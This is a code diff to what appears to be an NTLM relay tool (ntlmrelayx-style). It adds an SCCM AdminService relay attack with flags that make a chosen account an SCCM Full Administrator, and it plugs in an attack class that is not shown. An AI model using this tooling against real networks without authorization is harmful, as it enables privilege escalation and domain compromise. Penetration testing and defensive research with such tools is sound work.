@@ -75,7 +75,6 @@ def main():
             c.setEnumLocalAdmins(options.enum_local_admins)
             c.setEncoding(codec)
             c.setMode(mode)
-            c.setAttacks(PROTOCOL_ATTACKS)
             c.setLootdir(options.lootdir)
             c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
             c.setIPv6(options.ipv6)
@@ -91,13 +90,28 @@ def main():
             c.setKrbOptions(options.format, options.victim)
             c.setIsADCSAttack(options.adcs)
             c.setADCSOptions(options.template)
+            c.setAdminServiceOptions(options.adminservice, options.logonname,
+                                     options.displayname, options.objectsid)
+
+            # AdminService replaces the HTTPS attack with our own self-contained class
+            if options.adminservice:
+                from lib.attacks.sccmadminserviceattack import SCCMAdminServiceAttack
+                attacks = dict(PROTOCOL_ATTACKS)
+                attacks['HTTPS'] = SCCMAdminServiceAttack
+                c.setAttacks(attacks)
+            else:
+                c.setAttacks(PROTOCOL_ATTACKS)
 
             #If the redirect option is set, configure the HTTP server to redirect targets to SMB
             if server is HTTPKrbRelayServer and options.r is not None:
                 c.setMode('REDIRECT')
                 c.setRedirectHost(options.r)
 
-            s = server(c)
+            try:
+                s = server(c)
+            except Exception as e:
+                logging.warning('Failed to start %s: %s', server.__name__, str(e))
+                continue
             s.start()
             threads.add(s)
         return c
@@ -186,11 +200,23 @@ def main():
     adcsoptions.add_argument('--altname', action='store', metavar="ALTNAME", required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
     adcsoptions.add_argument('-v', "--victim", action='store', metavar = 'TARGET', help='Victim username or computername$, to request the correct certificate name.')
 
+    # SCCM AdminService attack options
+    adminoptions = parser.add_argument_group("SCCM AdminService attack options")
+    adminoptions.add_argument('--adminservice', action='store_true', required=False, help='Enable SCCM AdminService relay attack to add a Full Administrator')
+    adminoptions.add_argument('--logonname', action='store', metavar='LOGONNAME', required=False, help='Logon name (DOMAIN\\user or user@domain) of the account to add as SCCM Full Administrator')
+    adminoptions.add_argument('--displayname', action='store', metavar='DISPLAYNAME', required=False, help='Display name of the account to add as SCCM Full Administrator')
+    adminoptions.add_argument('--objectsid', action='store', metavar='SID', required=False, help='SID of the account to add as SCCM Full Administrator')
+
     try:
         options = parser.parse_args()
     except Exception as e:
         logging.error(str(e))
         sys.exit(1)
+
+    if options.adminservice:
+        if not options.logonname or not options.displayname or not options.objectsid:
+            logging.error('--adminservice requires --logonname, --displayname, and --objectsid')
+            sys.exit(1)
 
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
